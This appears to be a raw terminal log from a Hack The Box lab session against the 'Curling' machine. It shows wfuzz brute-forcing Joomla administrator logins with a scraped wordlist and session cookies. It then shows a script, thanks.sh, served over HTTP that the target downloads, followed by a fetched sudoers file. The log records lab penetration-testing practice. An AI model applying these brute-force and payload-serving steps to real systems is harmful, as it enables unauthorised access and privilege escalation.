@@ -1,0 +1,367 @@
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #wfuzz -w cewl.out -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&d4d7af8487e0d9b4fec5da48d8019f08=1' http
+://10.10.10.150/administrator/index.php                                                                                                                 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                     
+
+********************************************************                    
+* Wfuzz 2.4 - The Web Fuzzer                           *                    
+********************************************************                    
+
+Target: http://10.10.10.150/administrator/index.php                         
+Total requests: 191                   
+
+===================================================================         
+ID           Response   Lines    Word     Chars       Payload                                                                                           
+===================================================================         
+
+000000007:   303        0 L      0 W      0 Ch        "world"                                                                                           
+000000008:   303        0 L      0 W      0 Ch        "Hello"                                                                                           
+000000009:   303        0 L      0 W      0 Ch        "Comments"                                                                                        
+000000010:   303        0 L      0 W      0 Ch        "comment"                                                                                         
+000000001:   303        0 L      0 W      0 Ch        "Job"                                                                                             
+000000002:   303        0 L      0 W      0 Ch        "Portal"                                                                                          
+000000003:   303        0 L      0 W      0 Ch        "site"                                                                                            
+000000004:   303        0 L      0 W      0 Ch        "WordPress"                                                                                       
+000000005:   303        0 L      0 W      0 Ch        "content"                                                                                         
+000000006:   303        0 L      0 W      0 Ch        "wrap"                                                                                            
+000000011:   303        0 L      0 W      0 Ch        "entry"                                                                                           
+000000013:   303        0 L      0 W      0 Ch        "header"                                                                                          
+000000012:   303        0 L      0 W      0 Ch        "Feed"                                                                                            
+000000014:   303        0 L      0 W      0 Ch        "branding"                                                                                        
+000000016:   303        0 L      0 W      0 Ch        "April"                                                                                           
+000000019:   303        0 L      0 W      0 Ch        "the"                                                                                             
+000000015:   303        0 L      0 W      0 Ch        "navigation"                                                                                      
+000000017:   303        0 L      0 W      0 Ch        "post"                                                                                            
+000000018:   303        0 L      0 W      0 Ch        "Commenter"                                                                                       
+000000020:   303        0 L      0 W      0 Ch        "Jobs"                                                                                            
+000000026:   303        0 L      0 W      0 Ch        "Syndication"                                                                                     
+000000028:   303        0 L      0 W      0 Ch        "another"                                                                                         
+000000021:   303        0 L      0 W      0 Ch        "Search"                                                                                          
+000000022:   303        0 L      0 W      0 Ch        "Recent"                                                                                          
+000000023:   303        0 L      0 W      0 Ch        "RSS"                                                                                             
+000000025:   303        0 L      0 W      0 Ch        "Simple"                                                                                          
+000000029:   303        0 L      0 W      0 Ch        "your"                                                                                            
+000000030:   303        0 L      0 W      0 Ch        "page"                                                                                            
+000000024:   303        0 L      0 W      0 Ch        "Really"                                                                                          
+000000027:   303        0 L      0 W      0 Ch        "Just"                                                                                            
+000000034:   303        0 L      0 W      0 Ch        "Skip"                                                                                            
+000000036:   303        0 L      0 W      0 Ch        "custom"                                                                                          
+000000038:   303        0 L      0 W      0 Ch        "top"                                                                                             
+000000039:   303        0 L      0 W      0 Ch        "masthead"                                                                                        
+000000031:   303        0 L      0 W      0 Ch        "Listing"                                                                                         
+000000040:   303        0 L      0 W      0 Ch        "main"                                                                                            
+000000032:   303        0 L      0 W      0 Ch        "meta"                                                                                            
+000000033:   303        0 L      0 W      0 Ch        "Reply"                                                                                           
+000000035:   303        0 L      0 W      0 Ch        "text"                                                                                            
+000000037:   303        0 L      0 W      0 Ch        "Menu"                                                                                            
+000000046:   303        0 L      0 W      0 Ch        "colophon"                                                                                        
+000000048:   303        0 L      0 W      0 Ch        "RSD"                                                                                             
+000000049:   303        0 L      0 W      0 Ch        "Posts"                                                                                           
+000000050:   303        0 L      0 W      0 Ch        "Log"                                                                                             
+000000041:   303        0 L      0 W      0 Ch        "primary"                                                                                         
+000000042:   303        0 L      0 W      0 Ch        "Uncategorized"                                                                                   
+000000043:   303        0 L      0 W      0 Ch        "Proudly"                                                                                         
+000000044:   303        0 L      0 W      0 Ch        "powered"                                                                                         
+000000045:   303        0 L      0 W      0 Ch        "info"                                                                                            
+000000047:   303        0 L      0 W      0 Ch        "contain"                                                                                         
+000000051:   303        0 L      0 W      0 Ch        "org"                                                                                             
+000000055:   303        0 L      0 W      0 Ch        "This"                                                                                            
+000000057:   303        0 L      0 W      0 Ch        "Edit"                                                                                            
+000000060:   303        0 L      0 W      0 Ch        "start"                                                                                           
+000000052:   303        0 L      0 W      0 Ch        "Powered"                                                                                         
+000000053:   303        0 L      0 W      0 Ch        "comments"                                                                                        
+000000054:   303        0 L      0 W      0 Ch        "Welcome"                                                                                         
+000000056:   303        0 L      0 W      0 Ch        "first"                                                                                           
+000000058:   303        0 L      0 W      0 Ch        "delete"                                                                                          
+000000059:   303        0 L      0 W      0 Ch        "then"                                                                                            
+000000062:   303        0 L      0 W      0 Ch        "for"                                                                                             
+000000063:   303        0 L      0 W      0 Ch        "Posted"                                                                                          
+000000064:   303        0 L      0 W      0 Ch        "Archives"                                                                                        
+000000061:   303        0 L      0 W      0 Ch        "writing"                                                                                         
+000000066:   303        0 L      0 W      0 Ch        "Meta"                                                                                            
+000000065:   303        0 L      0 W      0 Ch        "Categories"                                                                                      
+000000069:   303        0 L      0 W      0 Ch        "state"                                                                                           
+000000067:   303        0 L      0 W      0 Ch        "Entries"                                                                                         
+000000068:   303        0 L      0 W      0 Ch        "secondary"                                                                                       
+000000070:   303        0 L      0 W      0 Ch        "art"                                                                                             
+000000071:   303        0 L      0 W      0 Ch        "semantic"                                                                                        
+000000072:   303        0 L      0 W      0 Ch        "personal"                                                                                        
+000000074:   303        0 L      0 W      0 Ch        "platform"                                                                                        
+000000073:   303        0 L      0 W      0 Ch        "publishing"                                                                                      
+000000075:   303        0 L      0 W      0 Ch        "http"                                                                                            
+000000076:   303        0 L      0 W      0 Ch        "Pen"                                                                                             
+000000077:   303        0 L      0 W      0 Ch        "Tester"                                                                                          
+000000079:   303        0 L      0 W      0 Ch        "Email"                                                                                           
+000000080:   303        0 L      0 W      0 Ch        "with"                                                                                            
+000000081:   303        0 L      0 W      0 Ch        "and"                                                                                             
+000000082:   303        0 L      0 W      0 Ch        "email"                                                                                           
+000000078:   303        0 L      0 W      0 Ch        "takis"                                                                                           
+000000083:   303        0 L      0 W      0 Ch        "this"                                                                                            
+000000085:   303        0 L      0 W      0 Ch        "started"                                                                                         
+000000084:   303        0 L      0 W      0 Ch        "get"                                                                                             
+000000086:   303        0 L      0 W      0 Ch        "moderating"                                                                                      
+000000088:   303        0 L      0 W      0 Ch        "deleting"                                                                                        
+000000087:   303        0 L      0 W      0 Ch        "editing"                                                                                         
+000000091:   303        0 L      0 W      0 Ch        "screen"                                                                                          
+000000089:   303        0 L      0 W      0 Ch        "please"                                                                                          
+000000090:   303        0 L      0 W      0 Ch        "visit"                                                                                           
+000000092:   303        0 L      0 W      0 Ch        "dashboard"                                                                                       
+000000093:   303        0 L      0 W      0 Ch        "avatars"                                                                                         
+000000094:   303        0 L      0 W      0 Ch        "come"                                                                                            
+000000095:   303        0 L      0 W      0 Ch        "from"                                                                                            
+000000096:   303        0 L      0 W      0 Ch        "Gravatar"                                                                                        
+000000097:   303        0 L      0 W      0 Ch        "address"                                                                                         
+000000098:   303        0 L      0 W      0 Ch        "will"                                                                                            
+000000100:   303        0 L      0 W      0 Ch        "Comment"                                                                                         
+000000099:   303        0 L      0 W      0 Ch        "marked"                                                                                          
+000000103:   303        0 L      0 W      0 Ch        "Date"                                                                                            
+000000105:   303        0 L      0 W      0 Ch        "says"                                                                                            
+000000106:   303        0 L      0 W      0 Ch        "author"                                                                                          
+000000101:   303        0 L      0 W      0 Ch        "Name"                                                                                            
+000000102:   303        0 L      0 W      0 Ch        "Title"                                                                                           
+000000104:   303        0 L      0 W      0 Ch        "One"                                                                                             
+000000107:   303        0 L      0 W      0 Ch        "metadata"                                                                                        
+000000108:   303        0 L      0 W      0 Ch        "body"                                                                                            
+000000109:   303        0 L      0 W      0 Ch        "Leave"                                                                                           
+000000112:   303        0 L      0 W      0 Ch        "Your"                                                                                            
+000000113:   303        0 L      0 W      0 Ch        "not"                                                                                             
+000000111:   303        0 L      0 W      0 Ch        "reply"                                                                                           
+000000110:   303        0 L      0 W      0 Ch        "Cancel"                                                                                          
+000000114:   303        0 L      0 W      0 Ch        "published"                                                                                       
+000000115:   303        0 L      0 W      0 Ch        "Required"                                                                                        
+000000116:   303        0 L      0 W      0 Ch        "fields"                                                                                          
+000000117:   303        0 L      0 W      0 Ch        "are"                                                                                             
+000000118:   303        0 L      0 W      0 Ch        "Website"                                                                                         
+000000119:   303        0 L      0 W      0 Ch        "respond"                                                                                         
+000000120:   303        0 L      0 W      0 Ch        "Address"                                                                                         
+000000121:   303        0 L      0 W      0 Ch        "Wed"                                                                                             
+000000122:   303        0 L      0 W      0 Ch        "Apr"                                                                                             
+000000124:   303        0 L      0 W      0 Ch        "php"                                                                                             
+000000123:   303        0 L      0 W      0 Ch        "index"                                                                                           
+000000125:   303        0 L      0 W      0 Ch        "hello"                                                                                           
+000000126:   303        0 L      0 W      0 Ch        "Latest"                                                                                          
+000000127:   303        0 L      0 W      0 Ch        "degree"                                                                                          
+000000128:   303        0 L      0 W      0 Ch        "Salary"                                                                                          
+000000129:   303        0 L      0 W      0 Ch        "Start"                                                                                           
+000000130:   303        0 L      0 W      0 Ch        "End"                                                                                             
+000000131:   303        0 L      0 W      0 Ch        "Location"                                                                                        
+000000132:   303        0 L      0 W      0 Ch        "Greece"                                                                                          
+000000133:   303        0 L      0 W      0 Ch        "Information"                                                                                     
+000000134:   303        0 L      0 W      0 Ch        "pentester"                                                                                       
+000000135:   303        0 L      0 W      0 Ch        "Apply"                                                                                           
+000000136:   303        0 L      0 W      0 Ch        "Now"                                                                                             
+000000137:   303        0 L      0 W      0 Ch        "Category"                                                                                        
+000000138:   303        0 L      0 W      0 Ch        "Username"                                                                                        
+000000139:   303        0 L      0 W      0 Ch        "Password"                                                                                        
+000000140:   303        0 L      0 W      0 Ch        "Lost"                                                                                            
+000000141:   303        0 L      0 W      0 Ch        "password"                                                                                        
+000000145:   303        0 L      0 W      0 Ch        "wordpress"                                                                                       
+000000142:   303        0 L      0 W      0 Ch        "Back"                                                                                            
+000000143:   303        0 L      0 W      0 Ch        "hourly"                                                                                          
+000000144:   303        0 L      0 W      0 Ch        "https"                                                                                           
+000000146:   303        0 L      0 W      0 Ch        "Application"                                                                                     
+000000147:   303        0 L      0 W      0 Ch        "Details"                                                                                         
+000000148:   303        0 L      0 W      0 Ch        "you"                                                                                             
+000000149:   303        0 L      0 W      0 Ch        "have"                                                                                            
+000000151:   303        0 L      0 W      0 Ch        "down"                                                                                            
+000000150:   303        0 L      0 W      0 Ch        "Scroll"                                                                                          
+000000152:   303        0 L      0 W      0 Ch        "Month"                                                                                           
+000000156:   303        0 L      0 W      0 Ch        "asterisk"                                                                                        
+000000157:   303        0 L      0 W      0 Ch        "must"                                                                                            
+000000154:   303        0 L      0 W      0 Ch        "feed"                                                                                            
+000000155:   303        0 L      0 W      0 Ch        "Fields"                                                                                          
+000000153:   303        0 L      0 W      0 Ch        "Remember"                                                                                        
+000000158:   303        0 L      0 W      0 Ch        "filled"                                                                                          
+000000159:   303        0 L      0 W      0 Ch        "out"                                                                                             
+000000160:   303        0 L      0 W      0 Ch        "before"                                                                                          
+000000161:   303        0 L      0 W      0 Ch        "submitting"                                                                                      
+^C                                    
+Finishing pending requests...         
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #wfuzz --hc 200-w cewl.out -b '99fb082d992a92668ce87e5540bd20fa=7mqtk9knolrci0tnhosci32ral; c0548020854924e0aecd05ed9f5b672b=ckrtf3p475vb7esh7gquva
+4soj'  -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&d4d7af8487e0d9b4fec5da48d8019f08=1' http://10.10.10.150/a
+dministrator/index.php                
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                     
+
+********************************************************                    
+* Wfuzz 2.4 - The Web Fuzzer                           *                    
+*                                                      *                    
+* Version up to 1.4c coded by:                         *                    
+* Christian Martorella (cmartorella@edge-security.com) *                    
+* Carlos del ojo (deepbit@gmail.com)                   *                    
+*                                                      *                    
+* Version 1.4d to 2.4 coded by:                        *                    
+* Xavier Mendez (xmendez@edge-security.com)            *                    
+********************************************************                    
+
+Usage:  wfuzz [options] -z payload,params <url>                             
+
+        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.                             
+        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering. 
+
+
+Examples:                             
+        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z                                           
+        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}                                                                   
+        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ                                                                        
+
+Type wfuzz -h for further information or --help for advanced usage.         
+
+Fatal exception: Too many arguments.  
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #wfuzz --hc 200 -w cewl.out -b '99fb082d992a92668ce87e5540bd20fa=7mqtk9knolrci0tnhosci32ral; c0548020854924e0aecd05ed9f5b672b=ckrtf3p475vb7esh7gquv
+a4soj'  -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&d4d7af8487e0d9b4fec5da48d8019f08=1' http://10.10.10.150/
+administrator/index.php                                                                                                                                 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                     
+
+********************************************************                    
+* Wfuzz 2.4 - The Web Fuzzer                           *                    
+********************************************************                    
+
+Target: http://10.10.10.150/administrator/index.php                         
+Total requests: 191                   
+
+===================================================================         
+ID           Response   Lines    Word     Chars       Payload                                                                                           
+===================================================================         
+
+000000004:   303        0 L      0 W      0 Ch        "WordPress"                                                                                       
+000000013:   200        0 L      20 W     115 Ch      "header"                                                                               ^Z         
+[1]+  Stopped                 wfuzz --hc 200 -w cewl.out -b '99fb082d992a92668ce87e5540bd20fa=7mqtk9knolrci0tnhosci32ral; c0548020854924e0aecd05ed9f5b672b=ckrtf3p475vb7esh7gquva4soj' -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&d4d7af8487e0d9b4fec5da48d8019f08=1' http://10.10.10.150/administrator/index.php                              
+┌─[✗]─[root@parrot]─[~/hackthebox/curling]                                  
+└──╼ #wfuzz --hc 200 -w cewl.out -b '99fb082d992a92668ce87e5540bd20fa=7mqtk9knolrci0tnhosci32ral; c0548020854924e0aecd05ed9f5b672b=ckrtf3p475vb7esh7gquva4soj'  -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&d4d7af8487e0d9b4fec5da48d8019f08=1' http://10.10.10.150/ad
+ministrator/index.php                                                                                                                                   
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                     
+
+********************************************************                    
+* Wfuzz 2.4 - The Web Fuzzer                           *                    
+********************************************************                    
+
+Target: http://10.10.10.150/administrator/index.php                         
+Total requests: 191                   
+
+===================================================================         
+ID           Response   Lines    Word     Chars       Payload                                                                                           
+===================================================================         
+
+
+Total time: 45.05248                  
+Processed Requests: 191               
+Filtered Requests: 191                
+Requests/sec.: 4.239499               
+
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #wfuzz --hc 200 -w cewl.out -b 'c0548020854924e0aecd05ed9f5b672b=ckrtf3p475vb7esh7gquva4soj; 99fb082d992a92668ce87e5540bd20fa=7rj1f9j4df92cgrcau0k4j8tji'  -d 'username=FUZZ&passwd=Curling%21&option=com_login&task=login&return=aW5kZXgucGhw&d4d7af8487e0d9b4fec5da48d8019f08=1' http://10.10.10.150/admi
+nistrator/index.php                   
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                     
+
+********************************************************                    
+* Wfuzz 2.4 - The Web Fuzzer                           *                    
+********************************************************                    
+
+Target: http://10.10.10.150/administrator/index.php                         
+Total requests: 191                   
+
+===================================================================         
+ID           Response   Lines    Word     Chars       Payload                                                                                           
+===================================================================         
+
+000000013:   200        114 L    373 W    5403 Ch     "header"                                                                                          
+Fatal exception: Pycurl error 28: Operation timed out after 90000 milliseconds with 2305 out of 5403 bytes received                                     
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #cat cewl.out | grep floris                                                                                                                        
+┌─[✗]─[root@parrot]─[~/hackthebox/curling]                                  
+└──╼ #cat cewl.out | grep ?loris                                                                                                                        
+┌─[✗]─[root@parrot]─[~/hackthebox/curling]                                  
+└──╼ #cat cewl.out | grep Floris                                                                                                                        
+┌─[✗]─[root@parrot]─[~/hackthebox/curling]                                  
+└──╼ #pluma cewl.out                  
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #ls                              
+cewl.out  joomscan.out  nmap  secret.txt                                    
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #cewl -w cewl.out 10.10.10.10                                                                                                                      
+CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)  
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #cat cewl.out | grep Floris      
+┌─[✗]─[root@parrot]─[~/hackthebox/curling]                                  
+└──╼ #vi credential                   
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #                                
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #ifconfig                        
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                  
+        inet 10.0.2.8  netmask 255.255.255.0  broadcast 10.0.2.255          
+        inet6 fe80::ed96:d3ba:685a:109f  prefixlen 64  scopeid 0x20<link>   
+        ether 08:00:27:29:cf:e4  txqueuelen 1000  (Ethernet)                
+        RX packets 12145  bytes 8463257 (8.0 MiB)                           
+        RX errors 0  dropped 0  overruns 0  frame 0                         
+        TX packets 12784  bytes 1921761 (1.8 MiB)                           
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0          
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                
+        inet 127.0.0.1  netmask 255.0.0.0                                   
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>                        
+        loop  txqueuelen 1000  (Local Loopback)                             
+        RX packets 16356  bytes 9064021 (8.6 MiB)                           
+        RX errors 0  dropped 0  overruns 0  frame 0                         
+        TX packets 16356  bytes 9064021 (8.6 MiB)                           
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0          
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500          
+        inet 10.10.14.14  netmask 255.255.254.0  destination 10.10.14.14    
+        inet6 dead:beef:2::100c  prefixlen 64  scopeid 0x0<global>          
+        inet6 fe80::8c7d:467a:5f00:eb6a  prefixlen 64  scopeid 0x20<link>   
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)                                                                
+        RX packets 1858  bytes 1139945 (1.0 MiB)                            
+        RX errors 0  dropped 0  overruns 0  frame 0                         
+        TX packets 2270  bytes 388588 (379.4 KiB)                           
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0          
+
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #vi thanks.sh                    
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #ls                              
+cewl.out  credential  joomscan.out  nmap  secret.txt  thanks.sh             
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #mkdir www                       
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #mv thanks.sh www/               
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #ls                              
+cewl.out  credential  joomscan.out  nmap  secret.txt  www                   
+┌─[root@parrot]─[~/hackthebox/curling]
+└──╼ #cd www/                         
+┌─[root@parrot]─[~/hackthebox/curling/www]                                  
+└──╼ #python -m SimpleHTTPServer      
+Serving HTTP on 0.0.0.0 port 8000 ... 
+10.10.10.150 - - [30/Dec/2019 00:04:00] "GET /thanks.sh HTTP/1.1" 200 -     
+10.10.10.150 - - [30/Dec/2019 00:04:54] "GET /thanks.sh HTTP/1.1" 200 -     
+^CTraceback (most recent call last):  
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main      
+    "__main__", fname, loader, pkg_name)                                    
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code                 
+    exec code in run_globals          
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>      
+    test()                            
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test          
+    BaseHTTPServer.test(HandlerClass, ServerClass)                          
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test            
+    httpd.serve_forever()             
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever     
+    poll_interval)                    
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry      
+    return func(*args)                
+KeyboardInterrupt                     
+┌─[✗]─[root@parrot]─[~/hackthebox/curling/www]                              
+└──╼ #python -m SimpleHTTPServer      
+Serving HTTP on 0.0.0.0 port 8000 ... 
+10.10.10.150 - - [30/Dec/2019 19:51:11] "GET /thanks.sh HTTP/1.1" 200 -     
+10.10.10.150 - - [30/Dec/2019 20:36:56] code 404, message File not found    
+10.10.10.150 - - [30/Dec/2019 20:36:56] "GET /gyan HTTP/1.1" 404 -          
+10.10.10.150 - - [30/Dec/2019 21:43:56] "GET /sudoers HTTP/1.1" 200 -       
